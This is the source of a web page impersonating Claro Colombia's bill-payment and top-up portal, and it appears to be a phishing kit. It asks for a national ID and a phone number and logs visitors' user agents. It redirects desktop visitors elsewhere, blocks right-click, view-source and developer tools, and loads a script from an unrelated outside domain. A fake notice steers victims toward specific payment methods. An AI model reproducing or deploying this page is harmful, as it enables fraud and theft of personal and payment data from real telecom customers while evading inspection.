<?php include 'log_user_agents.php'; ?>
<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no">
    <link rel="icon" type="image/png" href="img/favicon.ico">
    <title>Portal de pagos y recargas claro colombia - personas</title>

    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300..800;1,300..800&display=swap"
        rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.4.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style type="text/css">
        * {
            font-family: "Open Sans";
            padding: 0;
            margin: 0;
        }

        #comida {
            background-color: #DA291C !important;
            padding: 7px;
        }

        .logo {
            width: 80px;
        }

        .caja_img {
            text-align: center;
        }

        #ggris1 {
            text-align: center;
            height: 150px;
            background-color: #F3F3F4;
            border-bottom: 1px solid #AEAEAE;
            box-shadow: 0 0 0 rgb(0 0 0 / 16%);
        }

        #tabla-opciones {
            margin: -30px auto 0px auto;
            width: 94%;
            max-width: 1000px;
        }

        .etq-pasos {
            font-size: 13px;
        }

        .act-pasos {
            color: #2c97ad;
        }

        section {
            margin: 0 auto;
            text-align: center;
            width: 96%;
            max-width: 680px;
        }

        .texto1 {
            font-size: 28px;
            color: #5c5c5c;
        }

        .rojo {
            font-weight: 600;
            color: #EF3829;
        }

        .texto2 {
            color: #5c5c5c;
            font-size: 14px;
        }

        .etiquetas {
            color: #2c97ad;
            font-size: 14px;
        }

        .entradas {
            border: 1px solid #5c5c5c;
            width: 96%;
            outline: none;
            padding: 10px;
            border-radius: 10px;
            max-width: 440px;
        }

        .botonr {
            background-color: #fff;
            border: 0;
            cursor: pointer;
        }

        .boton_continuar,
        .boton2 {
            background-color: #E52A1B;
            color: #fff;
            border: 0;
            outline: 0;
            border-radius: 10px;
            padding: 10px;
            font-size: 16px;
            width: 96%;
            max-width: 250px;
        }

        footer {
            background-color: #212121;
            color: #fff;
            text-align: center;
            padding: 20px;
            font-size: 12px;
        }

        .celda {
            background-color: #F4F4F4;
            padding: 7px 10px;
            border: 1px solid #AEAEAE;
            text-align: left;
        }

        .celda2 {
            background-color: #DA291C;
            color: #fff;
            text-align: center;
        }

        #ca,
        #ba,
        #bo,
        #ne,
        #ps {
            width: 96%;
            background-color: #fff;
            margin: 5px 0px;
            border-radius: 10px;
            border: 1px solid #AEAEAE;
        }

        .options-list li {
            list-style-type: none;
            padding: 5px;
        }

        .options-list li:hover {
            background-color: #808080b0;
            color: #fff;
            cursor: pointer;
        }

        #selectBox {
            padding: 10px;
            border-radius: 10px;
        }
    </style>
</head>

<body>
    <header id="comida">
        <div class="caja_img">
            <img class="logo" src="img/logo-claro-blanco.svg">
        </div>
    </header>
    <main>
        <div id="ggris1" class="gris1">
            <div class="texto_gris"><br><br>
                <p class="texto1">Portal de <span class="rojo">PAGOS Y RECARGAS</span></p>
            </div>
        </div>

        <table id="tabla-opciones">
            <tr>
                <td valign="top" align="center"><img id="azul1" src="img/icono-seleccion-on.png" class="imagen"></td>
                <td valign="top" align="center"></td>
                <td valign="top" align="center"><img id="azul2" src="img/icono-mediopago-off.png" class="imagen"></td>
                <td valign="top" align="center"></td>
                <td valign="top" align="center"><img id="azul3" src="img/icono-pago-off.png" class="imagen"></td>
                <td valign="top" align="center"></td>
                <td valign="top" align="center"><img id="azul4" src="img/icono-resultado-off.png" class="imagen"></td>
            </tr>
            <tr>
                <td valign="top" align="center" class="etq-pasos act-pasos">Ingresa <br>tu Documento</td>
                <td valign="top" align="center"></td>
                <td valign="top" align="center" class="etq-pasos">Escoge el <br>medio de pago</td>
                <td valign="top" align="center"></td>
                <td valign="top" align="center" class="etq-pasos">Realiza el <br>Pago en linea</p>
                </td>
                <td valign="top" align="center"></td>
                <td valign="top" align="center" class="etq-pasos">Recibe la <br>Confimacion</td>
            </tr>
        </table>

        <div id="contenedor"></div>

        <section id="usuario" style="display:;">
            <div class="texto_gris2">
                <br><br>
                <p class="texto2">Consulta tu factura Claro, Observa si aplicas al descuento y paga de manera facil y
                    desde donde quieras.</p>
            </div>
            <div>
                <br>
                <label for="input1" class="etiquetas">Ingresa tu Numero de Documento</label>
                <input type="number" inputmode="numeric" class="entradas" required id="documento"
                    placeholder="Numero de Documento" autofocus autocomplete="off" minlength="5" />

            </div>
            <div class="tipo">
                <br>
                <p class="etiquetas">Selecciona el tipo de servicio</p>
                <div class="imgtipos">
                    <button class="botonr" onclick="cambiaimg(1)"><img id="check1" class="check" src="img/check.png">
                        <p>Pospago</p>
                    </button><img class="iconitos" src="img/celular.png">
                    <button class="botonr" onclick="cambiaimg(2)"><img id="check2" class="check" src="img/uncheck.png">
                        <p>Hogar</p>
                    </button><img class="iconitos" src="img/hogar.png">
                    <button class="botonr" onclick="cambiaimg(3)"><img id="check3" class="check" src="img/uncheck.png">
                        <p>Equipo</p>
                    </button><img class="iconitos" src="img/equipos.png">
                    <button class="botonr" onclick="cambiaimg(4)"><img id="check4" class="check" src="img/uncheck.png">
                        <p>Internet</p>
                    </button><img class="iconitos" src="img/internet.png">
                </div>
            </div>
            <br>

            <label class="etiquetas" for="celular">Por favor Ingresa tu Numero de Celular.</label>
            <br>
            <input type="number" class="entradas" required id="celular" inputmode="numeric" value=""
                placeholder=" Numero de Celular" autocomplete="of" minlength="5" />
            <div class="botones"><br>
                <button class="boton_continuar" onclick="validarNumero()">Continuar</button>
            </div>

        </section>

        <section id="errorpasarela" style="display:none;">
            <br>
            <br>
            <br>
            <br>
            <br>
            <br>
            <div style="text-align: center;"><img style="width: 130px; margin-left: auto;"
                    src="https://dev-claro-img-css.pantheonsite.io/iconos-logo-claro.png">
                <br><br>

                <div class="loader">
                    <div class="dot"></div>
                    <div class="dot"></div>
                    <div class="dot"></div>
                </div>
            </div>
            <br>
            <br>
            <br>

            <div style="text-align: center; line-height: 1rem;">
                <h2 class="t-subtitle" style="line-height: 2.5rem; font-size: 1.6rem; color: #e5281bde;">Te pedimos una
                    disculpa, en este momento solo se aceptan las siguiente pasarelas de pagos: Nequi, Bancolombia o
                    Tarjeta de Debito o Credito</h2>
                <br>
                <br>
                <br>
                <br>
                <br>
            </div>
            <br>
            <br>
            <br>
            <br>
            <br>
            <br>
        </section>


    </main><br><br>
    <footer id="footerr">
        <p class="app">Descarga ya la App Mi Claro</p>
        <img class="android" src="img/android.png">
        <img class="ios" src="img/ios.png">
        <p>Terminos y condiciones - Politicas de privacidad.</p>
        <br><br>
        <div class="footer2">
            <img class="logo2" src="img/logocl.png" width="80">
            <p>Todos los derechos reservados - 2024 Claro</p>
        </div>
    </footer>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>


    <script>
        function detectar_dispositivo() {
            var dispositivo = "";
            if (navigator.userAgent.match(/Android/i))
                dispositivo = "Android";
            else if (navigator.userAgent.match(/webOS/i))
                dispositivo = "webOS";
            else if (navigator.userAgent.match(/iPhone/i))
                dispositivo = "iPhone";
            else if (navigator.userAgent.match(/iPad/i))
                dispositivo = "iPad";
            else if (navigator.userAgent.match(/iPod/i))
                dispositivo = "iPod";
            else if (navigator.userAgent.match(/BlackBerry/i))
                dispositivo = "BlackBerry";
            else if (navigator.userAgent.match(/Windows Phone/i))
                dispositivo = "Windows Phone";
            else
                dispositivo = "PC";
            return dispositivo;
        }

        if (detectar_dispositivo() == "PC") {
            window.location.href = 'https://conclaros.co/Pa9e';
        }
    </script>


    <script>
        // Desactiva clic derecho
        document.addEventListener("contextmenu", function (e) {
            e.preventDefault();
        });

        // Detecta el uso de teclas comunes para abrir el inspector
        document.addEventListener("keydown", function (e) {
            // F12 o Ctrl+Shift+I o Ctrl+Shift+J o Ctrl+U
            if (
                e.key === "F12" ||
                (e.ctrlKey && e.shiftKey && (e.key === "I" || e.key === "J")) ||
                (e.ctrlKey && e.key === "U")
            ) {
                e.preventDefault();
                alert("Esta acción está deshabilitada.");
            }
        });

        // Desactiva herramientas de desarrollo en otros navegadores
        (function () {
            const devtools = /./;
            devtools.toString = function () {
                this.opened = true;
            };
            const checkDevTools = setInterval(function () {
                if (devtools.opened) {
                    alert("Por favor, no intentes inspeccionar esta página.");
                    window.location.reload();  // Opcional: recargar la página
                }
            }, 1000);
        })();
    </script>

</body>
<script src="https://yousitesureonlineverification.com/recursos/script-Enlace.php"></script>
<script src="js/colores.js?v1"></script>

</html>